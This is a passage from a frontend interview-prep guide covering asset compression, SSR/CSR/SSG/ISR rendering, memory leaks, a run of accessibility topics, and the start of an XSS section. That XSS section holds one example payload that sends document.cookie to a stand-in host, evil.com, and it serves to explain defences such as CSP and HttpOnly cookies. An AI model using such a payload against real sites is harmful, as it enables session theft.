**The pipeline in production:**
1. Build step: Minify JS/CSS/HTML.
2. Pre-compress: Generate `.br` and `.gz` versions of all static assets at build time (maximum compression).
3. CDN/server: Serve pre-compressed files based on `Accept-Encoding` header. No CPU cost per request.
4. For dynamic responses: Use Brotli level 4-6 (fast enough for real-time compression) or Gzip level 6.

**Measuring impact:**
- Use `Content-Encoding` header to verify compression is active.
- Chrome DevTools Network tab shows "Size" (transferred) vs "Resource Size" (uncompressed).
- A typical React app: 500KB unminified -> 180KB minified -> 55KB Brotli-compressed.

**Advanced: Selective minification:**
- Don't minify if serving source maps to production (for error monitoring with Sentry/Datadog).
- `terser` options: `compress.passes: 2` for more aggressive optimization; `mangle.properties` for property name mangling (dangerous, requires careful configuration).
- CSS `@layer` order must be preserved during minification (some older tools broke this).

**What interviewers are really testing:** Whether you understand the full build-to-browser pipeline and can reason about where bytes are saved. Knowing about pre-compression and Brotli levels shows ops experience.

**Red flag answer:** Confusing minification with compression. Not knowing Brotli. Thinking "just enable gzip" is sufficient.

**Follow-up:**
- Why would you pre-compress static assets at build time rather than compress on-the-fly?
- What is the trade-off between Brotli compression levels, and how would you configure it differently for static vs dynamic content?
- How do source maps interact with minification in a production environment with error monitoring?
</Accordion>

<Accordion title="29. Rendering Patterns (SSR vs CSR vs SSG vs ISR)">
**Answer:**

Choosing a rendering pattern is one of the most consequential architectural decisions for a web application. Each pattern makes different trade-offs between performance, freshness, infrastructure cost, and complexity.

**Client-Side Rendering (CSR):**
- Browser downloads a minimal HTML shell + JS bundle, then renders everything client-side.
- **Pros:** Simple deployment (static hosting), rich interactivity, no server costs per request.
- **Cons:** Blank page until JS loads/executes (poor LCP/FCP), SEO challenges (crawlers may not execute JS), larger JS bundles.
- **Best for:** Internal tools, dashboards, apps behind authentication (SEO doesn't matter).

**Server-Side Rendering (SSR):**
- Server renders full HTML on every request, sends it to the browser, then "hydrates" with JS for interactivity.
- **Pros:** Fast FCP/LCP (content visible before JS loads), excellent SEO, works without JS.
- **Cons:** Higher server costs (CPU per request), slower TTFB (server must render), hydration overhead (client must re-process the DOM to attach event listeners).
- **Hydration is the hidden cost:** The client downloads HTML AND JS, then "replays" the render to attach event listeners. This means users see content early but can't interact until hydration completes -- the "uncanny valley."
- **Best for:** Content that changes per request (personalized pages, search results).

**Static Site Generation (SSG):**
- Pages are rendered to HTML at **build time** and served as static files.
- **Pros:** Fastest possible delivery (pre-built HTML from CDN), cheapest hosting (no server), inherently scalable.
- **Cons:** Build time grows with page count. Content is stale until next build. Not suitable for frequently-changing or personalized content.
- **Best for:** Marketing pages, documentation, blogs.

**Incremental Static Regeneration (ISR):**
- Static pages that **revalidate in the background** after a configurable time.
- **How it works:** First request serves stale page + triggers regeneration. Next request gets fresh page. `stale-while-revalidate` pattern.
- **On-demand ISR:** Trigger regeneration via webhook when content changes (e.g., CMS publish triggers rebuild of that specific page).
- **Best for:** E-commerce product pages (mostly static, occasional price/inventory changes).

**Modern patterns pushing boundaries:**
- **Streaming SSR** (React 18+): Server sends HTML in chunks as components resolve. The browser renders progressively. No waiting for the slowest data fetch.
- **Partial Hydration / Islands Architecture** (Astro): Only hydrate interactive components; static content stays as plain HTML. Dramatically reduces JS sent to client.
- **React Server Components (RSC):** Components that render only on the server, sending their output (not code) to the client. Reduces bundle size because component code never ships to the browser.
- **Resumability (Qwik):** Instead of replaying rendering for hydration, Qwik serializes the execution state and "resumes" on the client with zero hydration overhead.

**What interviewers are really testing:** Can you reason about the trade-offs for a specific business context? The answer to "which pattern" is always "it depends on the use case" -- but you must be able to articulate the specific trade-offs.

**Red flag answer:** "Always use SSR" or "always use CSR." Not knowing about the hydration problem. Not mentioning any patterns newer than basic SSR/CSR/SSG.

**Follow-up:**
- What is the "hydration uncanny valley," and how do React Server Components and Streaming SSR attempt to solve it?
- You are building an e-commerce site with 500K product pages that update prices hourly. Which rendering pattern do you choose and why?
- What is the Islands Architecture (Astro), and how does it differ from traditional partial hydration?
</Accordion>

<Accordion title="30. Memory Leaks in Frontend Applications">
**Answer:**

Memory leaks in SPAs are insidious because they accumulate over time. A user who keeps the tab open for hours (common for dashboards, email clients, chat apps) can see the tab consume gigabytes of RAM and eventually crash.

**The most common leak patterns (in order of frequency):**

1. **Detached DOM nodes:**
```javascript
// A removed element is still referenced in JS
const element = document.getElementById('list');
container.removeChild(element);
// `element` still holds the entire DOM subtree in memory
```
In React: storing a ref to a component that unmounts. The ref keeps the entire component tree alive.

2. **Event listeners not cleaned up:**
```javascript
// In React useEffect without cleanup
useEffect(() => {
  window.addEventListener('resize', handleResize);
  // LEAK: no return cleanup function
}, []);

// Fixed
useEffect(() => {
  window.addEventListener('resize', handleResize);
  return () => window.removeEventListener('resize', handleResize);
}, []);
```
This is the #1 leak in React applications. Every `useEffect` that adds a listener, timer, or subscription needs a cleanup return.

3. **Closures capturing large scopes:**
```javascript
function createHandler() {
  const hugeData = fetchLargeDataset(); // 50MB
  return function onClick() {
    console.log('clicked'); // doesn't use hugeData, but closure captures it
  };
}
```
The closure keeps `hugeData` alive as long as the handler exists.

4. **Timers and intervals:**
```javascript
setInterval(() => {
  const node = document.getElementById('status');
  node.textContent = getStatus(); // if #status is removed, the interval keeps running
}, 1000);
```

5. **Console.log in production:** Objects logged to the console are retained by DevTools. In production, a high-frequency `console.log(largeObject)` can leak memory.

6. **Map/Set/Array growing unbounded:** Caching without eviction (no LRU policy, no maximum size). In-memory event logs that grow forever.

**Debugging process:**
1. Open Chrome DevTools -> Memory panel.
2. Take a heap snapshot before the suspected action.
3. Perform the action (navigate away and back, open/close a modal many times).
4. Take another heap snapshot.
5. Compare snapshots: sort by "Alloc. Size" delta. Look for detached DOM trees, growing arrays.
6. Use "Allocation timeline" to see where allocations happen over time.

**What interviewers are really testing:** Have you actually found and fixed a memory leak? Describing the DevTools workflow and naming specific React patterns (useEffect cleanup) shows real experience.

**Red flag answer:** "JavaScript has garbage collection, so memory leaks can't happen." This is the biggest misconception in frontend development.

**Follow-up:**
- Walk me through how you would use Chrome DevTools to find a memory leak in a React application where memory grows every time a modal is opened and closed.
- What are "retaining paths" in a heap snapshot, and how do you use them to trace the root cause of a leak?
- How does React's `useEffect` cleanup function prevent memory leaks, and what happens if you forget it?
</Accordion>

<Accordion title="31. Semantic HTML">
**Answer:**

Semantic HTML means using elements that convey **meaning**, not just appearance. This is the single most impactful accessibility practice because it gives browsers, screen readers, and search engines a structured understanding of your content.

**Key semantic elements and what they communicate:**
- `<nav>` -- "This is a navigation region." Screen readers list all `<nav>` landmarks for quick jumping.
- `<main>` -- "This is the primary content." Only one per page. Screen readers can skip directly to it.
- `<article>` -- "This is self-contained content" (blog post, comment, card). Should make sense in isolation.
- `<section>` -- "This is a thematic grouping of content." Should have a heading.
- `<aside>` -- "This is tangentially related content" (sidebar, related links).
- `<header>` / `<footer>` -- Section headers/footers. Can appear multiple times (once per `<article>`, plus page-level).
- `<button>` vs `<div onclick>` -- A `<button>` is focusable, activatable with Enter/Space, announced as "button" by screen readers. A `<div>` has none of this. Recreating button behavior on a `<div>` requires `tabindex="0"`, `role="button"`, `onkeydown` for Enter/Space, and `aria-disabled` -- all of which you get for free with `<button>`.
- `<a>` vs `<button>` -- `<a>` navigates to a URL; `<button>` performs an action. This distinction matters for screen reader announcements and keyboard behavior (Enter activates links, Enter/Space activates buttons).

**The `<div>` soup problem:**
```html
<!-- BAD: Screen reader sees a flat list of text with no structure -->
<div class="nav">
  <div class="nav-item" onclick="goTo('/home')">Home</div>
</div>

<!-- GOOD: Screen reader announces "Navigation, Home link" -->
<nav aria-label="Main">
  <a href="/home">Home</a>
</nav>
```

**Real-world impact:** Screen readers like VoiceOver and NVDA allow users to jump between landmarks (`<nav>`, `<main>`, `<aside>`), headings, and form controls. If your page is all `<div>`s, these navigation shortcuts don't work, and blind users must Tab through every element sequentially.

**What interviewers are really testing:** Whether you think about accessibility from the start (using the right elements) vs bolting it on later (adding ARIA to divs). The first approach is cheaper, more robust, and less error-prone.

**Red flag answer:** "I use `<div>` with `role` attributes." This shows you know ARIA exists but don't understand that native semantics should come first. Also: using `<a>` without an `href` (it loses its implicit role and keyboard behavior).

**Follow-up:**
- What is the difference between `<section>` and `<div>`, and when should you use each?
- A designer gives you a mockup where a card is clickable. Should the entire card be an `<a>` tag, a `<button>`, or a `<div>` with `onClick`? What are the accessibility implications?
- How do screen reader users navigate a web page, and how does semantic HTML affect their experience?
</Accordion>

<Accordion title="32. ARIA Roles/Attributes">
**Answer:**

ARIA (Accessible Rich Internet Applications) provides attributes that supplement HTML semantics for complex interactive components that don't have native HTML equivalents.

**The First Rule of ARIA: Don't use ARIA if a native HTML element will do the job.** A `<button>` is always better than `<div role="button">`. Native elements come with built-in keyboard handling, focus management, and screen reader semantics. ARIA only bridges the gap for patterns like custom comboboxes, tree views, and tab panels.

**Three categories of ARIA:**

1. **Roles** -- Define what an element *is*:
   - **Landmark roles:** `role="navigation"`, `role="main"` (prefer semantic HTML instead: `<nav>`, `<main>`).
   - **Widget roles:** `role="dialog"`, `role="tablist"`, `role="tab"`, `role="tabpanel"`, `role="combobox"`, `role="menu"`.
   - **Document structure:** `role="heading"`, `role="list"`, `role="listitem"`.

2. **States** -- Describe dynamic conditions (change with interaction):
   - `aria-expanded="true/false"` -- Dropdown open/closed.
   - `aria-selected="true/false"` -- Tab or option selected.
   - `aria-checked="true/false/mixed"` -- Checkbox state.
   - `aria-disabled="true"` -- Different from HTML `disabled`: element remains in tab order (useful for tooltips explaining why it's disabled).

3. **Properties** -- Describe static characteristics:
   - `aria-label="Close dialog"` -- Text label when visible text is insufficient.
   - `aria-labelledby="heading-id"` -- Points to another element's text as the label.
   - `aria-describedby="hint-id"` -- Additional descriptive text (form hints, error messages).
   - `aria-live="polite/assertive"` -- Announces dynamic content changes (chat messages, form validation, notifications). `polite` waits for the user to finish; `assertive` interrupts immediately.

**Common ARIA patterns that require careful implementation:**
- **Dialog/Modal:** `role="dialog"`, `aria-modal="true"`, `aria-labelledby`, trap focus inside, return focus to trigger on close.
- **Tabs:** `role="tablist"` on container, `role="tab"` on each tab, `role="tabpanel"` on panels. Arrow keys should move between tabs (not Tab key).
- **Combobox (autocomplete):** `role="combobox"`, `aria-expanded`, `aria-activedescendant`, `aria-autocomplete`. This is one of the most complex ARIA patterns.

**What interviewers are really testing:** Do you reach for ARIA as a first resort or last resort? Can you implement a complex ARIA pattern (dialog focus trap, live regions)? Understanding `aria-live` is especially valuable because it's how you make SPAs accessible when content changes dynamically.

**Red flag answer:** Using ARIA to recreate what HTML already provides. Not knowing about `aria-live` for dynamic content. Adding `role="button"` to a `<div>` without also adding keyboard handling.

**Follow-up:**
- How does `aria-live` work, and when would you use `polite` vs `assertive`?
- Walk me through implementing an accessible modal: focus trap, keyboard handling, ARIA attributes, and focus restoration on close.
- What is `aria-activedescendant`, and when would you use it instead of moving actual DOM focus?
</Accordion>

<Accordion title="33. Keyboard Navigation">
**Answer:**

Approximately 15-20% of users rely on keyboard navigation (motor disabilities, power users, screen reader users). Every interactive element must be keyboard-accessible.

**Core keyboard interaction patterns:**
- **Tab/Shift+Tab** -- Move focus between interactive elements in DOM order.
- **Enter** -- Activate links and buttons.
- **Space** -- Activate buttons, toggle checkboxes, select options.
- **Arrow keys** -- Navigate within composite widgets (tabs, menus, radio groups, comboboxes).
- **Escape** -- Close modals, dropdowns, tooltips.

**Focus management essentials:**
- **Focus order** should match visual order. CSS `order`, `flex-direction: row-reverse`, or absolute positioning can create a disconnect between visual and DOM order. This is a WCAG violation (2.4.3).
- **`tabindex` values:**
  - `tabindex="0"` -- Makes a non-interactive element focusable in the natural tab order. Required for custom widgets.
  - `tabindex="-1"` -- Focusable via JavaScript (`element.focus()`) but not in the tab order. Used for programmatic focus management (e.g., focusing a heading after navigation).
  - `tabindex="1+"` -- **Never use positive values.** They override natural tab order and create maintenance nightmares.

- **Visible focus indicator** -- The `:focus-visible` pseudo-class shows focus rings for keyboard users but not for mouse clicks:
```css
:focus-visible {
  outline: 2px solid #4A90D9;
  outline-offset: 2px;
}
```
Removing `outline` globally (`*:focus { outline: none }`) is a WCAG violation and an accessibility disaster.

**Focus trapping (modals, dialogs):**
When a modal is open, Tab should cycle through elements inside the modal only, not escape to the page behind it. Implementation:
1. On open: move focus to the first focusable element inside the modal.
2. On Tab at the last element: wrap to the first element.
3. On Shift+Tab at the first element: wrap to the last element.
4. On Escape: close the modal.
5. On close: return focus to the element that triggered the modal.

The native `<dialog>` element with `showModal()` handles focus trapping automatically.

**Roving tabindex pattern (for composite widgets):**
In a tab list or toolbar, only one item should be in the tab order at a time. Arrow keys move focus within the group:
```html
<div role="tablist">
  <button role="tab" tabindex="0" aria-selected="true">Tab 1</button>
  <button role="tab" tabindex="-1">Tab 2</button>
  <button role="tab" tabindex="-1">Tab 3</button>
</div>
```

**What interviewers are really testing:** Can you build a keyboard-accessible complex widget, not just add `tabindex` to things? Focus trapping and roving tabindex are the advanced topics that show real a11y experience.

**Red flag answer:** "I add `tabindex` to make things focusable" without understanding focus trapping, roving tabindex, or the difference between `tabindex="0"` and `tabindex="-1"`. Removing focus outlines for aesthetic reasons.

**Follow-up:**
- How would you implement a roving tabindex for a custom tab component?
- What is the `inert` attribute, and how does it simplify focus management for modals?
- Your QA reports that keyboard users can Tab behind an open modal. How do you fix this?
</Accordion>

<Accordion title="34. Alt Text Best Practices">
**Answer:**

Alt text is the textual alternative for images, read by screen readers and displayed when images fail to load.

**Writing good alt text -- it is harder than it seems:**
- **Describe the content, not the appearance:** Not "Photo of a woman" but "Customer service representative helping a caller while looking at a monitor."
- **Be concise but informative:** 125 characters max is a common guideline (older screen readers truncate after that).
- **Context matters:** The same image might need different alt text depending on where it appears. A headshot on an "About" page: "Sarah Chen, VP of Engineering." The same headshot on a blog post by Sarah: `alt=""` (decorative, since the name is in the byline).
- **Include essential information:** If an image contains text (a chart, infographic), the alt text must convey that information or link to a long description.

**Special cases:**
- **Decorative images:** `alt=""` (empty string, not missing). The `alt` attribute must still be present, or screen readers will read the filename ("DSC_4523.jpg").
- **Linked images:** Alt text should describe the link destination, not the image. An image linking to a product: `alt="Nike Air Max 90 - View details"`, not `alt="Picture of a shoe"`.
- **Complex images (charts, diagrams):** Use `aria-describedby` pointing to a detailed text description, or provide a `<figcaption>`.
- **Icons:** If the icon conveys meaning (a trash can icon for "Delete"), use `aria-label="Delete"` on the button. If the icon is next to text that says "Delete," the icon should be `aria-hidden="true"`.
- **SVG images:** Use `<title>` inside the SVG + `role="img"` + `aria-labelledby="title-id"`.

**SEO impact:** Search engines use alt text to understand images. Keyword-stuffing alt text is a dark pattern that hurts both accessibility and SEO rankings.

**What interviewers are really testing:** Whether you think about alt text as a nuanced content decision, not just a checkbox item. The decorative vs informative distinction and context-dependent alt text show maturity.

**Red flag answer:** "Just describe the image." Not knowing that decorative images should have `alt=""`. Using `alt="image"` or `alt="photo"` (conveys nothing).

**Follow-up:**
- How would you write alt text for a data visualization (bar chart showing quarterly revenue)?
- What is the difference between `alt=""` and no `alt` attribute, and why does it matter?
- A site has 50,000 product images. How do you approach writing meaningful alt text at scale?
</Accordion>

<Accordion title="35. Contrast Ratios">
**Answer:**

Contrast ratio measures the luminance difference between foreground text and its background. Insufficient contrast makes text unreadable for users with low vision, color blindness, or in bright sunlight.

**WCAG requirements:**
- **AA (minimum):** 4.5:1 for normal text (&lt; 18px or &lt; 14px bold), 3:1 for large text (>= 18px or >= 14px bold).
- **AAA (enhanced):** 7:1 for normal text, 4.5:1 for large text.
- **Non-text elements:** UI components and graphics need 3:1 against adjacent colors (WCAG 2.1 SC 1.4.11). This includes: form input borders, button backgrounds, focus indicators, icons conveying information.

**Common violations:**
- Light gray text on white (`#999` on `#fff` = 2.85:1 -- fails AA). This is the most common violation on the web.
- Placeholder text: browsers default to a low-contrast color. Custom styling often makes it worse.
- Text over images: Without a text shadow, backdrop filter, or overlay, contrast varies unpredictably.
- Brand colors: Many brand palettes were designed without accessibility in mind. A common request: "Can we use our brand orange for body text?" Usually no.

**Tools and workflow:**
- **Design phase:** Figma plugins (Stark, A11y Color Contrast Checker). Build accessible palettes from the start.
- **Development:** Chrome DevTools (hover over any element, see contrast ratio). Firefox Accessibility Inspector.
- **Automated audit:** Lighthouse, axe-core (finds ~30% of contrast issues -- misses text over images, dynamic content).
- **Manual testing:** Use OS-level color filters to simulate color blindness (macOS: System Preferences -> Accessibility -> Display).

**Solving contrast without sacrificing design:**
- Adjust lightness/darkness while keeping hue: use HSL and modify the L value.
- Add text shadows or semi-transparent overlays for text on images.
- Use APCA (Advanced Perceptual Contrast Algorithm) -- the upcoming WCAG 3.0 contrast method that accounts for font size, weight, and polarity (dark on light vs light on dark) more accurately than the current algorithm.

**What interviewers are really testing:** Whether you consider contrast a design constraint from the beginning or an afterthought. Mentioning APCA and non-text contrast (2.1 SC 1.4.11) shows deep accessibility knowledge.

**Red flag answer:** "Just use Lighthouse to check." Automated tools catch easy cases but miss many real-world violations. Not knowing about the non-text contrast requirement.

**Follow-up:**
- What is APCA, and how does it improve on the current WCAG 2.x contrast algorithm?
- A designer gives you a mockup with gray text on a white background. The contrast ratio is 3.8:1. What do you do?
- How do you ensure accessible contrast for text rendered over a dynamic background image?
</Accordion>

<Accordion title="36. Testing Accessibility">
**Answer:**

Accessibility testing requires a **layered approach** because no single method catches everything. Automated tools catch about 30-40% of issues; the rest requires manual and user testing.

**Layer 1: Automated testing (catches ~30-40%):**
- **axe-core / axe-linter** -- The gold standard for automated a11y testing. Available as a browser extension (axe DevTools), CI integration (axe-core/playwright), ESLint plugin (eslint-plugin-jsx-a11y).
- **Lighthouse** -- Built into Chrome. Good for high-level audits but less thorough than axe.
- **Pa11y** -- CLI tool for CI pipelines. Can test multiple pages.
- **Storybook a11y addon** -- Runs axe on every component story. Catches issues at the component level before they reach production.

**What automated tools catch:** Missing alt text, insufficient contrast, missing form labels, duplicate IDs, missing ARIA attributes, invalid ARIA values.

**What they miss:** Logical reading order, meaningful alt text quality, focus management correctness, whether ARIA live regions actually make sense, keyboard interaction patterns, whether animation respects reduced-motion preferences.

**Layer 2: Manual testing (catches ~30-40% more):**
- **Keyboard-only navigation:** Unplug/disable mouse. Can you complete every task? Is focus visible? Is focus order logical? Can you escape modals?
- **Screen reader testing:**
  - macOS: VoiceOver (Cmd+F5) + Safari (VoiceOver is optimized for Safari, not Chrome)
  - Windows: NVDA (free) + Firefox/Chrome, or JAWS + Chrome
  - Mobile: TalkBack (Android) + Chrome, VoiceOver (iOS) + Safari
- **Zoom to 200%:** Does the layout still work? Is content still accessible? (WCAG 1.4.4)
- **Browser reading mode:** If your content doesn't work in Reader Mode, your semantic structure needs work.

**Layer 3: User testing (catches the remaining ~20-30%):**
- Test with actual users who have disabilities. No simulation replaces real experience.
- Organizations like Fable and AccessWorks connect you with disability testers.

**CI integration strategy:**
```
1. Pre-commit: eslint-plugin-jsx-a11y (catches code patterns)
2. Component tests: @axe-core/react in Storybook or unit tests
3. Integration tests: axe-playwright scanning key user flows
4. Pre-deploy: Lighthouse CI with a11y score thresholds (block deploys below 90)
5. Post-deploy: Manual audit quarterly + user testing
```

**What interviewers are really testing:** Whether your accessibility testing strategy goes beyond "run Lighthouse." The layered approach with specific tool recommendations at each layer shows you have actually implemented an a11y testing pipeline.

**Red flag answer:** "We use Lighthouse to check accessibility." Lighthouse catches surface-level issues only. Not mentioning manual keyboard/screen reader testing is a significant gap.

**Follow-up:**
- How would you integrate accessibility testing into a CI/CD pipeline? Be specific about tools and thresholds.
- You ran axe and Lighthouse and got 100% scores. Is your site accessible? Why or why not?
- How do you test screen reader compatibility, and why should you test in multiple screen readers?
</Accordion>

<Accordion title="37. Reduced Motion">
**Answer:**

The `prefers-reduced-motion` media query detects whether the user has requested minimal animation, typically through their OS accessibility settings.

**Who this affects and why:**
- Users with **vestibular disorders** (vertigo, motion sickness) -- affecting an estimated 35% of adults over 40.
- Users with **photosensitive epilepsy** -- rapid flashing/animation can trigger seizures.
- Users with **ADHD or cognitive disabilities** -- excessive motion is distracting.
- **Also:** users on low-power devices where animation drains battery.

**Implementation patterns:**

```css
/* Approach 1: Reduce animations (preferred) */
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
    scroll-behavior: auto !important;
  }
}

/* Approach 2: Progressive enhancement -- add motion for those who want it */
.card {
  /* No animation by default */
  opacity: 1;
}
@media (prefers-reduced-motion: no-preference) {
  .card {
    animation: fadeIn 0.3s ease;
  }
}
```

**Approach 2 is better** because it treats reduced motion as the default and enhances for those who can enjoy it. This follows the principle of progressive enhancement.

**What to reduce vs remove:**
- **Remove:** Parallax scrolling, auto-playing carousels, page transition animations, background video, zoom/fly-in animations.
- **Keep but reduce:** Simple fades (shorten duration), color transitions, opacity changes. These convey state changes without causing vestibular issues.
- **Never use:** Rapidly flashing content (>3 flashes/second) regardless of preference -- this is a WCAG AAA seizure risk requirement.

**JavaScript detection:**
```javascript
const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)');

// React hook
function usePrefersReducedMotion() {
  const [reduced, setReduced] = useState(
    () => window.matchMedia('(prefers-reduced-motion: reduce)').matches
  );
  useEffect(() => {
    const mq = window.matchMedia('(prefers-reduced-motion: reduce)');
    const handler = (e) => setReduced(e.matches);
    mq.addEventListener('change', handler);
    return () => mq.removeEventListener('change', handler);
  }, []);
  return reduced;
}
```

**What interviewers are really testing:** Whether you consider motion a potential accessibility barrier. Mentioning the progressive enhancement approach (motion as opt-in, not opt-out) shows mature thinking.

**Red flag answer:** "Just disable all animations." This is too aggressive -- some animations convey important state information. Not knowing about `prefers-reduced-motion` at all is a bigger red flag.

**Follow-up:**
- What is the difference between `prefers-reduced-motion: reduce` and `prefers-reduced-motion: no-preference`, and how does the progressive enhancement approach work?
- How does `prefers-reduced-motion` interact with JavaScript-driven animations (GSAP, Framer Motion)?
- Beyond `prefers-reduced-motion`, what other CSS media features support accessibility (e.g., `prefers-contrast`, `forced-colors`)?
</Accordion>

<Accordion title="38. Skip Links">
**Answer:**

Skip links are hidden-until-focused links at the very top of the page that allow keyboard and screen reader users to bypass repetitive content (navigation menus) and jump directly to the main content.

**Why they exist:** Imagine pressing Tab 47 times to get past the navigation on every page. Without skip links, keyboard users must navigate through the entire header, nav, and secondary menus on every page load. WCAG 2.4.1 (Level A) requires a mechanism to bypass repeated blocks.

**Implementation:**

```html
<!-- First element in <body> -->
<a href="#main-content" class="skip-link">Skip to main content</a>

<!-- ... navigation, header, etc ... -->

<main id="main-content" tabindex="-1">
  <!-- Main content -->
</main>
```

```css
.skip-link {
  position: absolute;
  left: -9999px;
  top: auto;
  width: 1px;
  height: 1px;
  overflow: hidden;
}
.skip-link:focus {
  position: fixed;
  top: 10px;
  left: 10px;
  width: auto;
  height: auto;
  padding: 8px 16px;
  background: #000;
  color: #fff;
  z-index: 10000;
  font-size: 1rem;
}
```

**Key details:**
- `tabindex="-1"` on the target element ensures focus actually moves there (some browsers don't scroll to `#id` targets for focus).
- The skip link should be the **very first focusable element** -- before any "announcement bar" or cookie banner.
- For complex pages, consider **multiple skip links**: "Skip to main content," "Skip to search," "Skip to footer."
- **SPAs:** Skip links should work after client-side navigation. In React Router, manage focus on route change: `document.getElementById('main-content').focus()`.

**What interviewers are really testing:** Whether you know about and have implemented skip links. It is a WCAG Level A requirement (the most basic level), yet many sites miss it.

**Red flag answer:** Not knowing what skip links are. Implementing them but making them always visible (poor UX for sighted users) or always hidden (inaccessible).

**Follow-up:**
- How do skip links work in a Single Page Application where navigation doesn't trigger a full page reload?
- What is the `tabindex="-1"` on the target for, and what happens if you omit it?
- Beyond skip links, what other mechanisms can help keyboard users navigate efficiently (e.g., landmark regions, heading hierarchy)?
</Accordion>

<Accordion title="39. Headings Hierarchy">
**Answer:**

Headings (`<h1>` through `<h6>`) create a navigable document outline. Screen reader users rely on this outline to understand page structure and jump between sections -- similar to how sighted users scan a page visually.

**Rules:**
1. **One `<h1>` per page** -- Describes the main topic. On a blog post, the `<h1>` is the post title. On a product page, it's the product name.
2. **No skipping levels** -- Go from `<h1>` to `<h2>` to `<h3>`, never from `<h1>` to `<h3>`. Skipping creates gaps in the outline that confuse screen reader navigation.
3. **Headings reflect content structure, not visual sizing** -- Don't use `<h3>` because you want smaller text. Use the correct heading level and style it with CSS.
4. **Every section should have a heading** -- Even if it's visually hidden (use `sr-only` class), sections benefit from headings for screen reader navigation.

**How screen reader users navigate:**
- VoiceOver: `VO+Cmd+H` to jump to next heading.
- NVDA: `H` key to jump between headings, `1-6` to jump to specific heading levels.
- A 2017 WebAIM survey found that **67.5% of screen reader users navigate by headings** as their primary method.

**Common violations:**
```html
<!-- BAD: Skips h2, uses headings for styling -->
<h1>Dashboard</h1>
<h4>Recent Activity</h4>  <!-- Should be h2 -->
<h3>Revenue Chart</h3>    <!-- Should be h2 -->

<!-- GOOD: Proper hierarchy -->
<h1>Dashboard</h1>
<h2>Recent Activity</h2>
<h2>Revenue Chart</h2>
  <h3>Monthly Breakdown</h3>
```

**Visually hidden headings for sections that need labels:**
```css
.sr-only {
  position: absolute;
  width: 1px; height: 1px;
  padding: 0; margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0;
}
```

**What interviewers are really testing:** Whether you understand headings as a navigation mechanism, not just visual styling. The connection to screen reader navigation patterns shows practical accessibility thinking.

**Red flag answer:** "Use h1 for big text and h3 for small text." Not understanding that heading hierarchy is a structural/navigational concern, not a visual one.

**Follow-up:**
- Your designer wants the section title to be visually small, but semantically it should be an `<h2>`. How do you reconcile this?
- How do headings interact with ARIA landmarks to create a navigable page?
- Should a modal dialog have its own heading hierarchy starting at `<h1>`, or continue from the page's hierarchy?
</Accordion>

<Accordion title="40. Form Labels and Accessibility">
**Answer:**

Every form input must have a programmatically-associated label. This is one of the most commonly failed WCAG criteria (1.3.1 Info and Relationships, Level A) and directly affects usability for screen readers, voice control, and even mouse users (clicking a label focuses its associated input).

**Methods of association (in order of preference):**

1. **Explicit `<label>` with `for` attribute:**
```html
<label for="email">Email address</label>
<input id="email" type="email" name="email">
```
**Best method.** Clear, robust, increases clickable area.

2. **Wrapping input in label:**
```html
<label>
  Email address
  <input type="email" name="email">
</label>
```
No `id` needed. Works well but some screen readers handle it slightly differently.

3. **`aria-label` (when no visible label exists):**
```html
<input type="search" aria-label="Search products" placeholder="Search...">
```
For icon-only buttons, search fields without visible labels.

4. **`aria-labelledby` (when the label is complex or elsewhere):**
```html
<h2 id="shipping-title">Shipping Address</h2>
<input aria-labelledby="shipping-title street-label" id="street">
<span id="street-label">Street</span>
```
Can reference multiple elements, creating a composite label.

**Critical mistakes:**
- **Placeholder is NOT a label:** Placeholder text disappears on input, is often low-contrast, and many screen readers don't treat it as a label. WCAG explicitly states placeholders are insufficient.
- **`title` attribute is NOT a reliable label:** Some screen readers read it, some don't. And users on mouse-only devices may never see it (tooltips only).
- **Duplicate IDs:** If two elements share the same `id`, `for` association breaks. Automated tools catch this.

**Additional form accessibility:**
- **Error messages:** Associate with `aria-describedby` so screen readers announce them in context:
```html
<label for="password">Password</label>
<input id="password" type="password" aria-describedby="password-error" aria-invalid="true">
<span id="password-error" role="alert">Password must be at least 8 characters</span>
```
- **Required fields:** Use the `required` attribute (announced by screen readers) and `aria-required="true"` (when not using native validation).
- **Grouping related inputs:** Use `<fieldset>` + `<legend>` for radio button groups and related field sets:
```html
<fieldset>
  <legend>Preferred contact method</legend>
  <label><input type="radio" name="contact" value="email"> Email</label>
  <label><input type="radio" name="contact" value="phone"> Phone</label>
</fieldset>
```

**What interviewers are really testing:** Whether you understand that labels are a programmatic association, not just visual proximity. The `aria-describedby` for error messages and `fieldset`/`legend` for grouping show depth.

**Red flag answer:** "I use placeholder text as the label." This is the #1 form accessibility violation.

**Follow-up:**
- How do you announce form validation errors to screen reader users in real-time (as they type)?
- What is the role of `<fieldset>` and `<legend>`, and when should you use them?
- How does `autocomplete` attribute improve accessibility and user experience for form inputs?
</Accordion>

<Accordion title="41. XSS (Cross-Site Scripting)">
**Answer:**

XSS is the most prevalent web vulnerability (consistently in OWASP Top 10). An attacker injects malicious JavaScript that executes in the context of a trusted origin, gaining access to cookies, DOM, and everything the user can do.

**Three types:**

1. **Reflected XSS** -- Malicious script is part of the request (URL parameter) and reflected in the response. Example: `search?q=<script>document.location='evil.com?c='+document.cookie</script>`. The victim clicks a crafted link.

2. **Stored XSS** -- Script is stored in the database (comment, profile, forum post) and served to every user who views that content. More dangerous because it doesn't require victim interaction beyond visiting the page.

3. **DOM-based XSS** -- The vulnerability is entirely client-side. JavaScript reads from an attacker-controlled source (URL hash, `document.referrer`, `postMessage`) and writes to a dangerous sink (`innerHTML`, `eval`, `document.write`). Example: `element.innerHTML = location.hash.slice(1)`.

**Defense layers (defense in depth):**

1. **Output encoding/escaping** -- Encode data before inserting into HTML/JS/CSS/URL contexts. React and Vue auto-escape JSX/template output by default -- but **`dangerouslySetInnerHTML`** (React) and **`v-html`** (Vue) bypass this protection.

2. **Content Security Policy (CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'; img-src *;
```
CSP is the strongest defense. It tells the browser which sources of code are legitimate. `script-src 'self'` blocks inline scripts and scripts from other domains. Nonce-based CSP is the gold standard: each page load generates a unique nonce, and only scripts with that nonce execute.

3. **HttpOnly cookies** -- Prevents JavaScript from accessing session cookies via `document.cookie`. Even if XSS executes, it can't steal the session cookie.

